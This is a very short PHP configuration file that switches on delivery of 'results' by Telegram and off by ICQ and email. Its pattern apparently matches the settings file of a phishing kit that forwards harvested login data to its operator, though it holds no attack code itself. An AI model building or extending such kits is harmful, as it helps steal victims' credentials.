<?php
ob_start();

$Telegram = 'yes'; // Yes / No to receive telegram result
$ICQ = 'no'; // Yes / No to receive icq result
$Email = 'no'; // Yes / No to receive Results via email

?> 
